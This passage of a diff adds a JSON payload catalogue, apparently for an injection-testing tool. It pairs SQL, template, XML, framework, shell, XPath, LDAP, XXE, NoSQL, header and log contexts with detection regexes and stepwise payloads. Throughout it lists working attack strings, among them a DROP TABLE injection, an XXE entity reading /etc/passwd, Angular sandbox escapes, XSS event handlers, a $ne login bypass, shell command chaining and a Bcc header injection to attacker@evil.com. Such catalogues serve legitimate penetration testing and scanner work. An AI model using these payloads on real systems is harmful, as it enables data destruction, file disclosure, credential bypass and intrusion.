+          "INSERT INTO metrics (value, type) VALUES (USER_INPUT, 'cpu')"
+        ],
+        "detection_regex": "(SELECT|INSERT|UPDATE|DELETE)\\b[^=<>!]*[=<>!]+\\s*USER_INPUT",
+        "structural_requirements": {
+          "escape": "Not needed (numeric context)",
+          "structure": "SQL operator or ;",
+          "payload": "SQL injection",
+          "cleanup": "-- (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "OR",
+            "UNION",
+            "WAITFOR",
+            "SLEEP",
+            "BENCHMARK"
+          ],
+          "manual_interaction": [
+            "AND",
+            "HAVING",
+            "GROUP",
+            "ORDER",
+            "LIMIT"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "123",
+          "step_2": "123;",
+          "step_3": "123; DROP TABLE users;",
+          "step_4": "123; DROP TABLE users; --"
+        }
+      },
+      "sql_like_patterns": {
+        "context_patterns": [
+          "SELECT * FROM users WHERE name LIKE '%USER_INPUT%'",
+          "WHERE column LIKE 'USER_INPUT%'",
+          "SELECT * FROM products WHERE title LIKE '%USER_INPUT'",
+          "WHERE description LIKE '%USER_INPUT%'",
+          "SELECT * FROM files WHERE filename LIKE '%.USER_INPUT'",
+          "WHERE email LIKE 'USER_INPUT@%'",
+          "SELECT * FROM articles WHERE content LIKE '%USER_INPUT%'",
+          "WHERE tag LIKE 'USER_INPUT_%'",
+          "SELECT * FROM logs WHERE message LIKE '%error%USER_INPUT%'",
+          "WHERE path LIKE '/admin/USER_INPUT%'",
+          "SELECT * FROM comments WHERE text LIKE '%USER_INPUT%'",
+          "WHERE category LIKE 'USER_INPUT%' OR category LIKE '%USER_INPUT'"
+        ],
+        "detection_regex": "\\bLIKE\\s+[\"']%?USER_INPUT%?[\"']",
+        "structural_requirements": {
+          "escape": "' (close string)",
+          "structure": "SQL operator",
+          "payload": "SQL injection with wildcards",
+          "cleanup": "-- (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "OR",
+            "UNION",
+            "ESCAPE",
+            "COLLATE",
+            "CAST"
+          ],
+          "manual_interaction": [
+            "AND",
+            "NOT",
+            "IN",
+            "EXISTS",
+            "BETWEEN"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "'",
+          "step_3": "' OR '1'='1",
+          "step_4": "' OR '1'='1' --"
+        }
+      }
+    },
+    "template_engines": {
+      "server_side_templates": {
+        "context_patterns": [
+          "Hello {{USER_INPUT}}!",
+          "{% if USER_INPUT %}content{% endif %}",
+          "${USER_INPUT}",
+          "{{USER_INPUT|escape}}",
+          "{% for item in USER_INPUT %}{{item}}{% endfor %}",
+          "{{USER_INPUT.name}}",
+          "{% set var = USER_INPUT %}",
+          "${USER_INPUT.toString()}",
+          "{{USER_INPUT|length}}",
+          "{% include USER_INPUT %}",
+          "{{USER_INPUT|default('none')}}",
+          "{% extends USER_INPUT %}",
+          "${USER_INPUT || 'default'}",
+          "{{USER_INPUT|upper}}",
+          "{% block USER_INPUT %}content{% endblock %}",
+          "{{USER_INPUT.property}}",
+          "${USER_INPUT.method()}",
+          "{% with USER_INPUT as var %}",
+          "{{USER_INPUT|join(',')}}",
+          "{% load USER_INPUT %}"
+        ],
+        "detection_regex": "(\\{\\{\\s*USER_INPUT[^}]*\\}\\}|\\{%[^%]*USER_INPUT[^%]*%\\}|\\$\\{[^}]*USER_INPUT[^}]*\\})",
+        "structural_requirements": {
+          "escape": "}} or %} (close template expression)",
+          "structure": "{{ or {% (open new expression)",
+          "payload": "Template injection payload",
+          "cleanup": "}} or %} (close expression)"
+        },
+        "structures": {
+          "auto_firing": [
+            "config",
+            "__class__",
+            "__import__",
+            "system",
+            "eval"
+          ],
+          "manual_interaction": [
+            "request",
+            "session",
+            "application",
+            "self",
+            "globals"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}{{",
+          "step_4": "}}{{7*7}}",
+          "step_5": "}}{{7*7}}{{"
+        }
+      },
+      "client_side_templates": {
+        "context_patterns": [
+          "<div>{{USER_INPUT}}</div>",
+          "<span ng-bind=\"USER_INPUT\"></span>",
+          "{{ USER_INPUT | filter }}",
+          "<div>{{USER_INPUT | currency}}</div>",
+          "<p ng-model=\"USER_INPUT\">",
+          "{{USER_INPUT.name}}",
+          "<span>{{USER_INPUT | date:'short'}}</span>",
+          "{{USER_INPUT || 'default'}}",
+          "<div ng-repeat=\"item in USER_INPUT\">",
+          "{{USER_INPUT | json}}",
+          "<input ng-value=\"USER_INPUT\">",
+          "{{USER_INPUT.length}}",
+          "<div v-text=\"USER_INPUT\">",
+          "{{USER_INPUT | limitTo:10}}",
+          "<span v-html=\"USER_INPUT\">",
+          "{{USER_INPUT.toString()}}",
+          "<div [innerHTML]=\"USER_INPUT\">",
+          "{{USER_INPUT | orderBy:'name'}}",
+          "<span *ngFor=\"let item of USER_INPUT\">"
+        ],
+        "detection_regex": "(\\{\\{\\s*USER_INPUT[^}]*\\}\\}|ng-\\w+\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"']|v-\\w+\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"']|\\[\\w+\\]\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"'])",
+        "structural_requirements": {
+          "escape": "}} (close expression)",
+          "structure": "Valid HTML or new template expression",
+          "payload": "Template injection or XSS",
+          "cleanup": "Depends on template engine"
+        },
+        "structures": {
+          "auto_firing": [
+            "constructor",
+            "$eval",
+            "$apply",
+            "$compile",
+            "__proto__"
+          ],
+          "manual_interaction": [
+            "$on",
+            "$watch",
+            "$emit",
+            "$broadcast",
+            "$scope"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}<script>",
+          "step_4": "}}<script>alert(1)",
+          "step_5": "}}<script>alert(1)</script>{{"
+        }
+      },
+      "template_attributes": {
+        "context_patterns": [
+          "<div class=\"{{USER_INPUT}}\">",
+          "<input value=\"{{USER_INPUT}}\">",
+          "<img src=\"{{USER_INPUT}}\">",
+          "<a href=\"{{USER_INPUT}}\">",
+          "<div id=\"{{USER_INPUT}}\">",
+          "<span title=\"{{USER_INPUT}}\">",
+          "<input placeholder=\"{{USER_INPUT}}\">",
+          "<div data-value=\"{{USER_INPUT}}\">",
+          "<img alt=\"{{USER_INPUT}}\">",
+          "<form action=\"{{USER_INPUT}}\">",
+          "<div style=\"color: {{USER_INPUT}};\">",
+          "<input name=\"{{USER_INPUT}}\">",
+          "<div aria-label=\"{{USER_INPUT}}\">",
+          "<span role=\"{{USER_INPUT}}\">",
+          "<meta content=\"{{USER_INPUT}}\">"
+        ],
+        "detection_regex": "<\\w+[^>]*\\w+\\s*=\\s*[\"'][^\"']*\\{\\{\\s*USER_INPUT[^}]*\\}\\}[^\"']*[\"'][^>]*>",
+        "structural_requirements": {
+          "escape": "}} (close template)",
+          "structure": "\" (close attribute)",
+          "payload": "Event handler or new attribute",
+          "cleanup": "{{ (start new template)"
+        },
+        "structures": {
+          "auto_firing": [
+            "onerror",
+            "onload",
+            "onfocus",
+            "autofocus",
+            "src"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "onmouseover",
+            "onmouseenter",
+            "onkeypress",
+            "class"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}\" onmouseover=\"alert(1)",
+          "step_4": "}}\" onmouseover=\"alert(1)\" class=\"{{"
+        }
+      }
+    },
+    "xml_soap": {
+      "xml_cdata": {
+        "context_patterns": [
+          "<data><![CDATA[USER_INPUT]]></data>",
+          "<description><![CDATA[USER_INPUT]]></description>",
+          "<content><![CDATA[USER_INPUT]]></content>",
+          "<message><![CDATA[USER_INPUT]]></message>",
+          "<text><![CDATA[USER_INPUT]]></text>",
+          "<value><![CDATA[USER_INPUT]]></value>",
+          "<comment><![CDATA[USER_INPUT]]></comment>",
+          "<body><![CDATA[USER_INPUT]]></body>",
+          "<script><![CDATA[USER_INPUT]]></script>",
+          "<style><![CDATA[USER_INPUT]]></style>",
+          "<title><![CDATA[USER_INPUT]]></title>",
+          "<summary><![CDATA[USER_INPUT]]></summary>"
+        ],
+        "detection_regex": "<\\w+><\\!\\[CDATA\\[USER_INPUT\\]\\]></\\w+>",
+        "structural_requirements": {
+          "escape": "]]> (close CDATA)",
+          "structure": "Valid XML",
+          "payload": "XML injection or XXE",
+          "cleanup": "<![CDATA[ (new CDATA)"
+        },
+        "structures": {
+          "auto_firing": [
+            "script",
+            "img",
+            "svg",
+            "iframe",
+            "object"
+          ],
+          "manual_interaction": [
+            "a",
+            "button",
+            "input",
+            "form",
+            "div"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "]]>",
+          "step_3": "]]><script>alert(1)</script><![CDATA[",
+          "step_4": "]]></data><script>alert(1)</script><data><![CDATA["
+        }
+      },
+      "xml_attributes": {
+        "context_patterns": [
+          "<element attr=\"USER_INPUT\">",
+          "<node id=\"USER_INPUT\" value=\"test\">",
+          "<item name=\"USER_INPUT\">",
+          "<data type=\"USER_INPUT\">",
+          "<field value=\"USER_INPUT\">",
+          "<tag class=\"USER_INPUT\">",
+          "<record id=\"USER_INPUT\" status=\"active\">",
+          "<entry key=\"USER_INPUT\">",
+          "<object ref=\"USER_INPUT\">",
+          "<link href=\"USER_INPUT\">",
+          "<image src=\"USER_INPUT\">",
+          "<document title=\"USER_INPUT\">",
+          "<property name=\"USER_INPUT\">",
+          "<setting value=\"USER_INPUT\">",
+          "<parameter data=\"USER_INPUT\">"
+        ],
+        "detection_regex": "<\\w+[^>]*\\w+\\s*=\\s*[\"']USER_INPUT[\"'][^>]*>",
+        "structural_requirements": {
+          "escape": "\" (close attribute)",
+          "structure": "Space + new attribute",
+          "payload": "New attribute or close tag",
+          "cleanup": "\" (close attribute)"
+        },
+        "structures": {
+          "auto_firing": [
+            "href",
+            "src",
+            "data",
+            "action",
+            "formaction"
+          ],
+          "manual_interaction": [
+            "onclick",
+            "style",
+            "class",
+            "id",
+            "name"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\" newattr=\"",
+          "step_4": "\" newattr=\"value",
+          "step_5": "\" newattr=\"value\""
+        }
+      },
+      "xml_text_content": {
+        "context_patterns": [
+          "<message>USER_INPUT</message>",
+          "<description>USER_INPUT</description>",
+          "<title>USER_INPUT</title>",
+          "<content>USER_INPUT</content>",
+          "<text>USER_INPUT</text>",
+          "<value>USER_INPUT</value>",
+          "<data>USER_INPUT</data>",
+          "<field>USER_INPUT</field>",
+          "<property>USER_INPUT</property>",
+          "<comment>USER_INPUT</comment>",
+          "<note>USER_INPUT</note>",
+          "<summary>USER_INPUT</summary>",
+          "<body>USER_INPUT</body>",
+          "<name>USER_INPUT</name>",
+          "<id>USER_INPUT</id>"
+        ],
+        "detection_regex": "<\\w+>USER_INPUT</\\w+>",
+        "structural_requirements": {
+          "escape": "Not needed (text context)",
+          "structure": "Valid XML text or tags",
+          "payload": "XML tags or entities",
+          "cleanup": "Close any opened tags"
+        },
+        "structures": {
+          "auto_firing": [
+            "script",
+            "img",
+            "svg",
+            "iframe",
+            "embed"
+          ],
+          "manual_interaction": [
+            "a",
+            "button",
+            "input",
+            "select",
+            "textarea"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "<script>",
+          "step_3": "<script>alert(1)",
+          "step_4": "<script>alert(1)</script>"
+        }
+      }
+    },
+    "framework_specific": {
+      "react_jsx": {
+        "context_patterns": [
+          "const data = \"USER_INPUT\"; return <div>{data}</div>;",
+          "<div dangerouslySetInnerHTML={{__html: \"USER_INPUT\"}} />",
+          "const msg = \"USER_INPUT\"; return <span>{msg}</span>;",
+          "<input value=\"USER_INPUT\" />",
+          "const title = \"USER_INPUT\"; return <h1>{title}</h1>;",
+          "<img src=\"USER_INPUT\" />",
+          "const content = \"USER_INPUT\"; return <p>{content}</p>;",
+          "<a href=\"USER_INPUT\">Link</a>",
+          "const className = \"USER_INPUT\"; return <div className={className}></div>;",
+          "<div title=\"USER_INPUT\">",
+          "const style = {color: \"USER_INPUT\"}; return <span style={style}></span>;",
+          "<button onClick={() => alert(\"USER_INPUT\")}>",
+          "const id = \"USER_INPUT\"; return <div id={id}></div>;",
+          "<textarea defaultValue=\"USER_INPUT\" />",
+          "const placeholder = \"USER_INPUT\"; return <input placeholder={placeholder} />;"
+        ],
+        "detection_regex": "(const|let|var)\\s+\\w+\\s*=\\s*[\"']USER_INPUT[\"']|<\\w+[^>]*[\"']USER_INPUT[\"'][^>]*>|\\{[\"']USER_INPUT[\"']\\}",
+        "structural_requirements": {
+          "escape": "\" (close string)",
+          "structure": "; (end statement)",
+          "payload": "JavaScript or JSX",
+          "cleanup": ";// (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "dangerouslySetInnerHTML",
+            "eval",
+            "Function",
+            "setTimeout",
+            "setInterval"
+          ],
+          "manual_interaction": [
+            "onClick",
+            "onMouseOver",
+            "onChange",
+            "onFocus",
+            "onSubmit"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\";",
+          "step_4": "\";alert(1);",
+          "step_5": "\";alert(1);//"
+        }
+      },
+      "angular_templates": {
+        "context_patterns": [
+          "<div>{{USER_INPUT}}</div>",
+          "<span [innerHTML]=\"USER_INPUT\"></span>",
+          "<div [ngClass]=\"USER_INPUT\">",
+          "<input [value]=\"USER_INPUT\">",
+          "<img [src]=\"USER_INPUT\">",
+          "<a [href]=\"USER_INPUT\">",
+          "<div [style.color]=\"USER_INPUT\">",
+          "<span [title]=\"USER_INPUT\">",
+          "<div [attr.data-value]=\"USER_INPUT\">",
+          "<input [placeholder]=\"USER_INPUT\">",
+          "<div (click)=\"doSomething(USER_INPUT)\">",
+          "<span [textContent]=\"USER_INPUT\">",
+          "<div [hidden]=\"USER_INPUT\">",
+          "<input [disabled]=\"USER_INPUT\">",
+          "<div [id]=\"USER_INPUT\">",
+          "<span *ngIf=\"USER_INPUT\">",
+          "<div *ngFor=\"let item of USER_INPUT\">",
+          "<input [(ngModel)]=\"USER_INPUT\">"
+        ],
+        "detection_regex": "(\\{\\{\\s*USER_INPUT[^}]*\\}\\}|\\[\\w+\\]\\s*=\\s*[\"']USER_INPUT[\"']|\\(\\w+\\)\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"']|\\*ng\\w+\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"'])",
+        "structural_requirements": {
+          "escape": "}} (close expression)",
+          "structure": "Valid Angular expression",
+          "payload": "Angular expression injection",
+          "cleanup": "{{ (start new expression)"
+        },
+        "structures": {
+          "auto_firing": [
+            "constructor",
+            "innerHTML",
+            "__proto__",
+            "eval",
+            "$eval"
+          ],
+          "manual_interaction": [
+            "(click)",
+            "(mouseover)",
+            "(focus)",
+            "(change)",
+            "(submit)"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}{{constructor.constructor('alert(1)')()",
+          "step_4": "}}{{constructor.constructor('alert(1)')()}}{{"
+        }
+      },
+      "vue_templates": {
+        "context_patterns": [
+          "<div>{{USER_INPUT}}</div>",
+          "<span v-html=\"USER_INPUT\"></span>",
+          "<div v-text=\"USER_INPUT\">",
+          "<input v-model=\"USER_INPUT\">",
+          "<img v-bind:src=\"USER_INPUT\">",
+          "<a :href=\"USER_INPUT\">",
+          "<div :class=\"USER_INPUT\">",
+          "<span :title=\"USER_INPUT\">",
+          "<div v-if=\"USER_INPUT\">",
+          "<span v-show=\"USER_INPUT\">",
+          "<input :value=\"USER_INPUT\">",
+          "<div :style=\"{color: USER_INPUT}\">",
+          "<span v-for=\"item in USER_INPUT\">",
+          "<div @click=\"handleClick(USER_INPUT)\">",
+          "<input :placeholder=\"USER_INPUT\">",
+          "<div :id=\"USER_INPUT\">",
+          "<span v-once=\"USER_INPUT\">",
+          "<div v-pre=\"USER_INPUT\">"
+        ],
+        "detection_regex": "(\\{\\{\\s*USER_INPUT[^}]*\\}\\}|v-\\w+\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"']|:\\w+\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"']|@\\w+\\s*=\\s*[\"'][^\"']*USER_INPUT[^\"']*[\"'])",
+        "structural_requirements": {
+          "escape": "}} (close mustache)",
+          "structure": "Valid Vue expression",
+          "payload": "Vue expression or HTML",
+          "cleanup": "{{ (start new expression)"
+        },
+        "structures": {
+          "auto_firing": [
+            "v-html",
+            "_c",
+            "$createElement",
+            "constructor",
+            "__proto__"
+          ],
+          "manual_interaction": [
+            "@click",
+            "@mouseover",
+            "@focus",
+            "@change",
+            "@submit"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "}}",
+          "step_3": "}}<script>alert(1)</script>{{",
+          "step_4": "}}<img src=x onerror=alert(1)>{{"
+        }
+      }
+    },
+    "command_injection": {
+      "linux_shell": {
+        "context_patterns": [
+          "echo \"USER_INPUT\"",
+          "grep \"USER_INPUT\" file.txt",
+          "ping -c 4 USER_INPUT",
+          "find / -name \"USER_INPUT\"",
+          "ls -la USER_INPUT",
+          "cat USER_INPUT",
+          "sed 's/pattern/USER_INPUT/g'",
+          "awk '{print USER_INPUT}'",
+          "curl http://USER_INPUT",
+          "wget USER_INPUT",
+          "tar -xzf USER_INPUT",
+          "ssh user@USER_INPUT"
+        ],
+        "detection_regex": "(echo|grep|ping|find|ls|cat|sed|awk|curl|wget|tar|ssh)\\s+[\"']?USER_INPUT",
+        "structural_requirements": {
+          "escape": "\" or ' (close string)",
+          "structure": "; or && or || (command separator)",
+          "payload": "New command",
+          "cleanup": "# (comment) or proper quoting"
+        },
+        "structures": {
+          "auto_firing": [
+            "id",
+            "whoami",
+            "pwd",
+            "ls",
+            "cat"
+          ],
+          "manual_interaction": [
+            "read",
+            "less",
+            "vi",
+            "nano",
+            "top"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"",
+          "step_3": "\";",
+          "step_4": "\"; ls",
+          "step_5": "\"; ls #",
+          "step_6": "\"; ls; echo \""
+        }
+      },
+      "windows_cmd": {
+        "context_patterns": [
+          "ping USER_INPUT",
+          "dir \"USER_INPUT\"",
+          "type USER_INPUT",
+          "echo USER_INPUT",
+          "findstr \"USER_INPUT\" file.txt",
+          "copy USER_INPUT destination",
+          "del USER_INPUT",
+          "ren USER_INPUT newname",
+          "mkdir USER_INPUT",
+          "cd USER_INPUT",
+          "net user USER_INPUT",
+          "reg query USER_INPUT"
+        ],
+        "detection_regex": "(ping|dir|type|echo|findstr|copy|del|ren|mkdir|cd|net|reg)\\s+[\"']?USER_INPUT",
+        "structural_requirements": {
+          "escape": "\" (if in quotes)",
+          "structure": "& or && or | or || (command separator)",
+          "payload": "New command",
+          "cleanup": "REM or :: (comment)"
+        },
+        "structures": {
+          "auto_firing": [
+            "dir",
+            "echo",
+            "type",
+            "ver",
+            "hostname"
+          ],
+          "manual_interaction": [
+            "pause",
+            "more",
+            "notepad",
+            "cmd",
+            "powershell"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "\"&",
+          "step_3": "\"& dir",
+          "step_4": "\"& dir & echo \"",
+          "step_5": "\"& dir & REM"
+        }
+      }
+    },
+    "xpath_injection": {
+      "xpath_string_predicates": {
+        "context_patterns": [
+          "//user[name='USER_INPUT']",
+          "//product[@id='USER_INPUT']",
+          "//item[price='USER_INPUT']",
+          "//book[author='USER_INPUT']",
+          "//employee[department='USER_INPUT']",
+          "//customer[@email='USER_INPUT']",
+          "//order[status='USER_INPUT']",
+          "//document[title='USER_INPUT']",
+          "//node[@attribute='USER_INPUT']",
+          "//element[text()='USER_INPUT']"
+        ],
+        "detection_regex": "//\\w+\\[[^=]+=\\s*[\"']USER_INPUT[\"']\\]",
+        "structural_requirements": {
+          "escape": "' (close string)",
+          "structure": "] (close predicate) or or operator",
+          "payload": "XPath expression",
+          "cleanup": "and '1'='1 (balance expression)"
+        },
+        "structures": {
+          "auto_firing": [
+            "or",
+            "and",
+            "|",
+            "parent",
+            "child"
+          ],
+          "manual_interaction": [
+            "following",
+            "preceding",
+            "ancestor",
+            "descendant",
+            "attribute"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "admin",
+          "step_2": "'",
+          "step_3": "'] | ",
+          "step_4": "'] | //user/*",
+          "step_5": "' or '1'='1",
+          "step_6": "' or '1'='1' or '"
+        }
+      },
+      "xpath_numeric_context": {
+        "context_patterns": [
+          "//item[position()=USER_INPUT]",
+          "//product[price>USER_INPUT]",
+          "//employee[salary=USER_INPUT]",
+          "//order[quantity>=USER_INPUT]",
+          "//user[age<USER_INPUT]",
+          "//book[pages=USER_INPUT]",
+          "//rating[score<=USER_INPUT]",
+          "//inventory[stock=USER_INPUT]"
+        ],
+        "detection_regex": "//\\w+\\[[^=<>]+[=<>]+\\s*USER_INPUT\\]",
+        "structural_requirements": {
+          "escape": "Not needed (numeric context)",
+          "structure": "] or XPath operator",
+          "payload": "XPath expression",
+          "cleanup": "Balance with valid expression"
+        },
+        "structures": {
+          "auto_firing": [
+            "or",
+            "and",
+            "div",
+            "mod",
+            "*"
+          ],
+          "manual_interaction": [
+            "+",
+            "-",
+            "=",
+            "!=",
+            "<"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "1",
+          "step_2": "1]",
+          "step_3": "1] | //",
+          "step_4": "1 or position()=1"
+        }
+      }
+    },
+    "ldap_injection": {
+      "ldap_filter_strings": {
+        "context_patterns": [
+          "(&(uid=USER_INPUT)(objectClass=person))",
+          "(cn=USER_INPUT)",
+          "(mail=USER_INPUT)",
+          "(&(sn=USER_INPUT)(givenName=*))",
+          "(|(uid=USER_INPUT)(cn=USER_INPUT))",
+          "(&(memberOf=USER_INPUT)(objectClass=user))",
+          "(department=USER_INPUT)",
+          "(&(title=USER_INPUT)(company=*))",
+          "(manager=USER_INPUT)",
+          "(&(employeeID=USER_INPUT)(status=active))"
+        ],
+        "detection_regex": "\\([^=]+=USER_INPUT[^)]*\\)",
+        "structural_requirements": {
+          "escape": ") (close current filter)",
+          "structure": "( (new filter) or operators",
+          "payload": "LDAP filter expression",
+          "cleanup": "Balance parentheses"
+        },
+        "structures": {
+          "auto_firing": [
+            "objectClass",
+            "cn",
+            "uid",
+            "mail",
+            "sn"
+          ],
+          "manual_interaction": [
+            "userPassword",
+            "memberOf",
+            "manager",
+            "department",
+            "title"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "admin",
+          "step_2": "*)",
+          "step_3": "*)(uid=*",
+          "step_4": "*)(uid=*)(|(uid=*",
+          "step_5": "admin)(|(objectClass=*"
+        }
+      }
+    },
+    "xxe_injection": {
+      "xml_document_context": {
+        "context_patterns": [
+          "<data>USER_INPUT</data>",
+          "<?xml version=\"1.0\"?><root>USER_INPUT</root>",
+          "<request><parameter>USER_INPUT</parameter></request>",
+          "<soap:Body><method>USER_INPUT</method></soap:Body>",
+          "<user><name>USER_INPUT</name></user>",
+          "<config><setting>USER_INPUT</setting></config>",
+          "<message><content>USER_INPUT</content></message>",
+          "<product><description>USER_INPUT</description></product>"
+        ],
+        "detection_regex": "<\\w+>USER_INPUT</\\w+>",
+        "structural_requirements": {
+          "escape": "Not always needed",
+          "structure": "XML entity declaration",
+          "payload": "External entity reference",
+          "cleanup": "Close any opened tags"
+        },
+        "structures": {
+          "auto_firing": [
+            "SYSTEM",
+            "PUBLIC",
+            "ENTITY",
+            "DOCTYPE",
+            "ELEMENT"
+          ],
+          "manual_interaction": [
+            "ATTLIST",
+            "NOTATION",
+            "INCLUDE",
+            "IGNORE",
+            "CDATA"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "<!DOCTYPE",
+          "step_3": "<!DOCTYPE foo [",
+          "step_4": "<!DOCTYPE foo [<!ENTITY",
+          "step_5": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+          "step_6": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>&xxe;"
+        }
+      }
+    },
+    "nosql_injection": {
+      "mongodb_query_context": {
+        "context_patterns": [
+          "db.users.find({username: \"USER_INPUT\"})",
+          "db.collection.findOne({email: \"USER_INPUT\"})",
+          "{\"name\": \"USER_INPUT\"}",
+          "db.products.find({category: \"USER_INPUT\"})",
+          "{\"_id\": \"USER_INPUT\"}",
+          "db.orders.find({status: \"USER_INPUT\"})",
+          "{\"userId\": \"USER_INPUT\", \"active\": true}",
+          "db.comments.find({author: \"USER_INPUT\"})",
+          "{\"data.value\": \"USER_INPUT\"}",
+          "db.logs.find({message: {$regex: \"USER_INPUT\"}})"
+        ],
+        "detection_regex": "(\\{[^:]+:\\s*[\"']USER_INPUT[\"']|db\\.\\w+\\.\\w+\\([^)]*[\"']USER_INPUT[\"'])",
+        "structural_requirements": {
+          "escape": "\" (close string)",
+          "structure": "} (close object) or , (new property)",
+          "payload": "NoSQL operators",
+          "cleanup": "Balance JSON structure"
+        },
+        "structures": {
+          "auto_firing": [
+            "$ne",
+            "$gt",
+            "$lt",
+            "$regex",
+            "$where"
+          ],
+          "manual_interaction": [
+            "$eq",
+            "$in",
+            "$exists",
+            "$type",
+            "$size"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "admin",
+          "step_2": "\"",
+          "step_3": "\", \"password\": {\"$ne\": \"",
+          "step_4": "\"}, {\"$gt\": \"",
+          "step_5": "admin\", \"$or\": [{\"username\": \"admin"
+        }
+      }
+    },
+    "header_injection": {
+      "http_header_context": {
+        "context_patterns": [
+          "Location: USER_INPUT",
+          "Set-Cookie: session=USER_INPUT",
+          "Content-Type: USER_INPUT",
+          "X-Custom-Header: USER_INPUT",
+          "Referer: USER_INPUT",
+          "User-Agent: USER_INPUT",
+          "Accept-Language: USER_INPUT",
+          "Authorization: Bearer USER_INPUT",
+          "X-Forwarded-For: USER_INPUT",
+          "Host: USER_INPUT"
+        ],
+        "detection_regex": "^[A-Za-z-]+:\\s*USER_INPUT",
+        "structural_requirements": {
+          "escape": "Not needed initially",
+          "structure": "\\r\\n (CRLF - new header)",
+          "payload": "New HTTP header",
+          "cleanup": "Proper line ending"
+        },
+        "structures": {
+          "auto_firing": [
+            "Location",
+            "Set-Cookie",
+            "Content-Type",
+            "Content-Length",
+            "Transfer-Encoding"
+          ],
+          "manual_interaction": [
+            "Referer",
+            "User-Agent",
+            "Accept",
+            "Authorization",
+            "Host"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "test",
+          "step_2": "test\\r\\n",
+          "step_3": "test\\r\\nX-Injected: true",
+          "step_4": "test\\r\\nSet-Cookie: admin=true",
+          "step_5": "test\\r\\n\\r\\n<html>"
+        }
+      },
+      "email_header_context": {
+        "context_patterns": [
+          "To: USER_INPUT",
+          "Subject: Re: USER_INPUT",
+          "From: USER_INPUT",
+          "Cc: USER_INPUT",
+          "Reply-To: USER_INPUT",
+          "Message-ID: USER_INPUT",
+          "In-Reply-To: USER_INPUT",
+          "References: USER_INPUT"
+        ],
+        "detection_regex": "^[A-Za-z-]+:\\s*[^:]*USER_INPUT",
+        "structural_requirements": {
+          "escape": "Not needed",
+          "structure": "\\n or \\r\\n (new header)",
+          "payload": "Additional headers",
+          "cleanup": "Proper formatting"
+        },
+        "structures": {
+          "auto_firing": [
+            "Bcc",
+            "Content-Type",
+            "MIME-Version",
+            "Content-Transfer-Encoding",
+            "X-Priority"
+          ],
+          "manual_interaction": [
+            "Reply-To",
+            "Return-Path",
+            "Sender",
+            "Date",
+            "Message-ID"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "user@example.com",
+          "step_2": "user@example.com\\n",
+          "step_3": "user@example.com\\nCc: attacker@evil.com",
+          "step_4": "user@example.com\\nBcc: attacker@evil.com\\n"
+        }
+      }
+    },
+    "log_injection": {
+      "log_entry_context": {
+        "context_patterns": [
+          "[2024-01-01] User 'USER_INPUT' logged in",
+          "Failed login for user: USER_INPUT",
+          "Access denied for USER_INPUT",
+          "[INFO] Request from USER_INPUT",
+          "Error: Invalid input from USER_INPUT",
+          "DEBUG: Processing request for USER_INPUT",
+          "WARN: Suspicious activity from USER_INPUT",
+          "Transaction ID: USER_INPUT completed",
+          "Session USER_INPUT terminated",
+          "File uploaded by USER_INPUT"
+        ],
+        "detection_regex": "(\\[\\w+\\]|INFO|DEBUG|WARN|ERROR).*USER_INPUT",
+        "structural_requirements": {
+          "escape": "Not typically needed",
+          "structure": "\\n or \\r (new log line)",
+          "payload": "Fake log entries",
+          "cleanup": "Match log format"
+        },
+        "structures": {
+          "auto_firing": [
+            "[INFO]",
+            "[ERROR]",
+            "[WARN]",
+            "[DEBUG]",
+            "[CRITICAL]"
+          ],
+          "manual_interaction": [
+            "[AUDIT]",
+            "[TRACE]",
+            "[ACCESS]",
+            "[SECURITY]",
+            "[SYSTEM]"
+          ]
+        },
+        "progressive_testing": {
+          "step_1": "testuser",
+          "step_2": "testuser\\n",
+          "step_3": "testuser\\n[2024-01-01] User 'admin' logged in successfully",
+          "step_4": "testuser\\r\\n[INFO] Password reset for admin completed"
+        }
+      }
+    }
+  },
+  "testing_methodology": {
+    "context_identification": [
+      "Inject unique markers (TESTXSS123) to trace data flow",
+      "View page source to see exact injection context",
+      "Use browser developer tools to inspect DOM",
+      "Test with different browsers for parsing variations"
+    ],
+    "progressive_testing_principles": [
+      "Always test structural components separately first",
+      "Verify each escape mechanism works before adding payload",
+      "Use progressive complexity in testing",
+      "Understand the parsing rules of each context",
+      "Test cleanup mechanisms to prevent syntax errors",
+      "Consider encoding variations for each context"
+    ],
+    "failure_analysis": [
